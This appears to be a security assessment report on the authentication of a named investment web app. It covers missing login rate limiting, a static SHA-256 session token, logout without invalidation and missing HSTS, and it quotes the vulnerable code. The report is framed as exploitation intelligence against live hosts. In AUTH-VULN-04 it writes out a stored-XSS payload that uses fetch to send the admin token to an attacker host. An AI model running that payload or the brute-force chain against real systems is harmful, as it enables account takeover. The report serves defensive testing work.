# Authentication Analysis Report

## 1. Executive Summary

- **Analysis Status:** Complete
- **Target:** MarsanInvest — `https://mminvest.pages.dev` / `https://empty-pine-8e64.marin-marsan.workers.dev`
- **Analysis Date:** 2026-03-06
- **Key Outcome:** Five exploitable authentication vulnerabilities were identified, spanning missing abuse defenses (no rate limiting), deterministic/non-rotating token management, session persistence post-logout, missing transport security headers (HSTS, Cache-Control: no-store), and Bearer token exposure in JSON response with insecure client-side storage. The most critical finding is the **complete absence of rate limiting on both admin login endpoints**, enabling unrestricted brute-force attacks.
- **Purpose of this Document:** This report provides strategic context on the application's authentication mechanisms, dominant flaw patterns, and key architectural details necessary to effectively exploit the vulnerabilities listed in the exploitation queue.

---

## 2. Dominant Vulnerability Patterns

### Pattern 1: Missing Abuse Defenses — Unlimited Brute-Force on Admin Login

- **Description:** Both `POST /admin/login` and `POST /admin/api/login` have **zero rate limiting, zero lockout, zero CAPTCHA, and zero backoff**. An attacker can submit an unlimited number of credential guesses in rapid succession. The code path at `worker.js:290-307` and `worker.js:312-329` contains no IP tracking, attempt counting, or throttle logic whatsoever.
- **Implication:** The entire security of the application rests on the strength of the admin password. Given no lockout exists, any password — regardless of complexity — is potentially enumerable over time. Combined with the deterministic token (Pattern 2), a successful brute-force directly yields a permanent admin session token.
- **Representative Findings:** `AUTH-VULN-01`, `AUTH-VULN-02`

### Pattern 2: Deterministic, Non-Rotating Static Token

- **Description:** The admin session token is computed as `SHA-256(ADMIN_USER + ':' + ADMIN_PASS + ':marsanai-session')` at `worker.js:122-126, 273-274`. This is a **deterministic, static token**: it never rotates, never expires server-side, is the same for every session, and is valid until credentials change. There is no nonce, no timestamp, no randomness.
- **Implication:** (a) Once an attacker learns the token via any vector (brute-force, XSS exfiltration, network capture), the token is permanently valid. (b) The token can be pre-computed offline if credentials are known. (c) After the admin logs out (which only clears the client cookie), the token remains valid — any party who obtained it continues to have full admin access.
- **Representative Findings:** `AUTH-VULN-03`, `AUTH-VULN-04`

### Pattern 3: Transport Security Gaps

- **Description:** The Cloudflare Worker at `empty-pine-8e64.marin-marsan.workers.dev` sets **no HSTS header** (`Strict-Transport-Security` absent — confirmed via live header inspection) and **no `Cache-Control: no-store`** on any authentication response. Auth responses (including 401 failures) contain no caching directives. The `mminvest.pages.dev` frontend also lacks HSTS. Both hosts serve only HTTPS currently, but without HSTS, browsers are not pinned to HTTPS and downgrade attacks remain theoretically possible in first-visit scenarios.
- **Implication:** Auth responses (including failed logins returning credentials) may be cached by browser or intermediary caches. Without HSTS, a first-visit network attacker could strip HTTPS.
- **Representative Findings:** `AUTH-VULN-05`

---

## 3. Strategic Intelligence for Exploitation

### Authentication Method
The system uses a **custom static bearer token** derived from admin credentials via SHA-256. There is one admin account only; no user accounts, no self-registration.

### Two Parallel Authentication Paths (same token, different transport)
1. **Form-based login** (`POST /admin/login`): Accepts `application/x-www-form-urlencoded`, returns `Set-Cookie: marsanai_session=<token>; HttpOnly; Secure; SameSite=Strict; Max-Age=86400`. Used to access `/admin` HTML routes.
2. **API-based login** (`POST /admin/api/login`): Accepts `application/json`, returns `{"success": true, "token": "<plaintext_token>"}` in the JSON body. Token is stored in `sessionStorage['marsanai_admin']` in the browser and sent as `Authorization: Bearer <token>` for subsequent API calls to `/admin/api/*` routes.

**Critical Detail:** The same token value is accepted by both the cookie check and the Bearer check. A token obtained via any method (brute-force, XSS exfiltration of sessionStorage, network interception) can be used with either auth method.

### Token Properties
- **Algorithm:** SHA-256
- **Input:** `ADMIN_USER + ':' + ADMIN_PASS + ':marsanai-session'` (static string from secrets)
- **Output:** 64-character lowercase hex string
- **Rotation:** Never — same for every request, every session, forever (until password changes)
- **Server-side expiry:** None — the token itself has no TTL; the 24h Max-Age only applies to the client cookie

### Session Storage Architecture
| Path | Token Storage | JavaScript Accessible? | Expiry |
|------|--------------|----------------------|--------|
| Form login | `HttpOnly` cookie `marsanai_session` | No | 24h Max-Age (client-side only) |
| API login | `sessionStorage['marsanai_admin']` | **Yes** — XSS-stealable | Browser tab close |

### CORS Configuration
`Access-Control-Allow-Origin: *` is applied to **all** API endpoints including both login endpoints. The `Authorization` header is explicitly allowed via `Access-Control-Allow-Headers`. This means:
- Cross-origin brute-force attacks from any domain are permitted
- `POST /admin/api/login` can be called from attacker-controlled pages
- **Note:** The wildcard CORS does NOT include `Access-Control-Allow-Credentials`, so HttpOnly cookies cannot be sent cross-origin. However, Bearer-based endpoints (`/admin/api/*`) are fully cross-origin accessible with a known token.

### Password Policy
No server-side password complexity enforcement exists. Credentials are set as Cloudflare Worker secrets. The comment in `worker.js:4-7` uses `"MojaSifra123!"` as an example, suggesting the developer may have used a predictable pattern. No MFA exists.

### No Recovery Flow
There is no password reset, recovery email, or "forgot password" functionality. This reduces the attack surface for reset token manipulation but does not mitigate the brute-force risk.

### Logout Behavior
`GET /admin/logout` clears the cookie with `Max-Age=0` but performs **no server-side invalidation**. The token remains valid indefinitely. Any attacker who captured the token before logout retains full admin access.

---

## 4. Detailed Finding Analysis

### FINDING AUTH-VULN-01: No Rate Limiting on POST /admin/login

**Methodology Check:** Section 2 — Rate limiting / CAPTCHA / monitoring
**Verdict:** VULNERABLE

**Evidence — Code (`worker.js:290-307`):**
```javascript
if (path === '/admin/login' && request.method === 'POST') {
  const body = await request.text();
  const form = parseFormData(body);

  if (form.username === env.ADMIN_USER && form.password === env.ADMIN_PASS) {
    return new Response(null, {
      status: 302,
      headers: {
        'Location': '/admin',
        'Set-Cookie': `marsanai_session=${validToken}; Path=/; Max-Age=86400; HttpOnly; Secure; SameSite=Strict`,
      },
    });
  }
  return new Response(loginPage('❌ Pogrešno korisničko ime ili lozinka'), {
    status: 401,
    headers: { 'Content-Type': 'text/html;charset=UTF-8' },
  });
}
```

No IP tracking, no counter, no sleep/backoff, no CAPTCHA trigger, no lockout. The entire handler is a direct credential compare with immediate response.

**Classification:** `Abuse_Defenses_Missing`
**Confidence:** High

---

### FINDING AUTH-VULN-02: No Rate Limiting on POST /admin/api/login

**Methodology Check:** Section 2 — Rate limiting / CAPTCHA / monitoring
**Verdict:** VULNERABLE

**Evidence — Code (`worker.js:312-329`):**
```javascript
if (path === '/admin/api/login' && request.method === 'POST') {
  try {
    const body = await request.json();
    if (body.username === env.ADMIN_USER && body.password === env.ADMIN_PASS) {
      return new Response(JSON.stringify({ success: true, token: validToken }), {
        headers: { ...CORS_HEADERS, 'Content-Type': 'application/json' },
      });
    }
    return new Response(JSON.stringify({ success: false }), {
      status: 401,
      headers: { ...CORS_HEADERS, 'Content-Type': 'application/json' },
    });
  } catch(e) {
    return new Response(JSON.stringify({ error: 'Bad request' }), {
      status: 400,
      headers: { ...CORS_HEADERS, 'Content-Type': 'application/json' },
    });
  }
}
```

Additionally: `CORS_HEADERS` includes `Access-Control-Allow-Origin: *`, meaning this endpoint can be brute-forced from any origin without browser-level restriction.

**Classification:** `Abuse_Defenses_Missing`
**Confidence:** High

---

### FINDING AUTH-VULN-03: Static Deterministic Token — No Session Rotation, No Expiry

**Methodology Check:** Section 4 — Token/session properties (entropy, protection, expiration & invalidation)
**Verdict:** VULNERABLE

**Evidence — Code (`worker.js:122-126, 273-274`):**
```javascript
// Token generation function
async function hashToken(text) {
  const data = new TextEncoder().encode(text);
  const hash = await crypto.subtle.digest('SHA-256', data);
  return [...new Uint8Array(hash)].map(b => b.toString(16).padStart(2, '0')).join('');
}

// Session secret and token computation (runs on every request)
const sessionSecret = env.ADMIN_USER + ':' + env.ADMIN_PASS + ':marsanai-session';
const validToken = await hashToken(sessionSecret);
```

The token is a pure deterministic function of static secrets with a static salt (`':marsanai-session'`). No nonce, no timestamp, no randomness. The same token is produced on every request and for every session.

**Server-side invalidation:** None. `GET /admin/logout` at `worker.js:279-287` only clears the cookie client-side. The token itself remains valid forever.

**Classification:** `Token_Management_Issue`
**Confidence:** High

---

### FINDING AUTH-VULN-04: Bearer Token Exposed in JSON Response + Insecure Storage in sessionStorage

**Methodology Check:** Section 4 — Token/session properties; Section 3 — Session management
**Verdict:** VULNERABLE

**Evidence — Code (`worker.js:316-318`):**
```javascript
return new Response(JSON.stringify({ success: true, token: validToken }), {
  headers: { ...CORS_HEADERS, 'Content-Type': 'application/json' },
});
```

**Client storage (`script.js:1383-1386`):**
```javascript
if (data.success) {
  adminToken = data.token;
  sessionStorage.setItem('marsanai_admin', adminToken);
  showAdminDash();
}
```

The token is transmitted in the JSON response body (not in an HttpOnly cookie) and stored in `sessionStorage` which is accessible to any JavaScript executing on the page. Given the confirmed Stored XSS vulnerability in the admin panel feedback rendering (`script.js:1479` — `it.email` interpolated unsanitized into `innerHTML`), an attacker can:
1. Submit feedback with XSS payload in email field
2. Wait for admin to view feedback tab
3. Payload executes in admin context: `fetch('https://attacker.com/?t='+sessionStorage.getItem('marsanai_admin'))`
4. Token is exfiltrated and is permanently valid (see AUTH-VULN-03)

**Classification:** `Token_Management_Issue`
**Confidence:** High

---

### FINDING AUTH-VULN-05: No HSTS Header + No Cache-Control: no-store on Auth Responses

**Methodology Check:** Section 1 — Transport & caching
**Verdict:** VULNERABLE (moderate severity — HSTS absent, caching absent)

**Live Evidence (confirmed via Playwright HTTP inspection):**
- `GET https://empty-pine-8e64.marin-marsan.workers.dev/status` → Response headers contain NO `strict-transport-security`
- `POST https://empty-pine-8e64.marin-marsan.workers.dev/admin/api/login` → Response headers contain NO `cache-control`
- `GET https://mminvest.pages.dev/` → Response headers contain NO `strict-transport-security`; `cache-control: public, max-age=0, must-revalidate` (not `no-store`)

**Code Evidence:** No `Cache-Control`, `Pragma`, or `Strict-Transport-Security` headers anywhere in `worker.js`. Search confirmed: these strings do not appear in the file.

**Impact assessment:**
- **HSTS absence:** On first visit, a network-adjacent attacker can attempt an SSL-stripping attack. Cloudflare does enforce HTTPS at the edge, but the application itself does not set HSTS, meaning browsers will not pin the site. Exploitability is Low for a purely external attacker with no network position.
- **Missing Cache-Control: no-store:** Auth responses (login success/failure, admin pages) may be cached by the browser. A successful `POST /admin/api/login` response containing `{"success": true, "token": "<...>"}` could be served from browser cache if a cached copy exists. More critically, the admin panel HTML (served at `GET /admin`) is returned without any caching directive, meaning it could be cached and viewed by another user of the same browser.

**Classification:** `Transport_Exposure`
**Confidence:** Medium (HSTS — Low exploitability for external attacker; Cache-Control — Medium exploitability)

---

## 5. Secure by Design: Validated Components

These components were analyzed and found to have adequate defenses. They are low-priority for further testing.

| Component/Flow | Endpoint/File Location | Defense Mechanism Implemented | Verdict |
|---|---|---|---|
| Session Cookie Flags | `worker.js:299` | `marsanai_session` cookie set with `HttpOnly; Secure; SameSite=Strict` — prevents XSS-based cookie theft and CSRF | SAFE |
| Form Login Cookie Path | `worker.js:299-300` | `Set-Cookie` on form login uses HttpOnly — form-login token not accessible to JavaScript | SAFE |
| User Enumeration Protection | `worker.js:303, 320-323` | Both login endpoints return identical error messages regardless of whether username or password is wrong: form returns `❌ Pogrešno korisničko ime ili lozinka`, API returns `{"success": false}`. No timing differentiation between wrong username vs wrong password in practical terms. | SAFE |
| No Open Redirects | `worker.js:280, 295-301` | All post-login and logout redirects use hardcoded `Location: /admin` — no user-controlled redirect target | SAFE |
| Credential Storage (Server) | `worker.js:4-7` | Admin credentials stored as Cloudflare Worker Secrets (`env.ADMIN_USER`, `env.ADMIN_PASS`) — not hardcoded in source. No default credentials found in code. | SAFE |
| No OAuth/SSO | N/A | No OAuth, OIDC, or SSO flows exist — no OAuth CSRF/nonce issues possible | N/A |
| No Password Reset Flow | N/A | No password reset/recovery functionality exists — eliminates reset token manipulation as attack vector | N/A |
| CORS Credentials | `worker.js:12-16` | `Access-Control-Allow-Credentials` is NOT set alongside the wildcard CORS — browsers will not send cookies cross-origin | SAFE |
| Admin Action Input Validation | `worker.js:357` | `action` parameter in toggle endpoint uses safe ternary — cannot inject arbitrary values | SAFE |
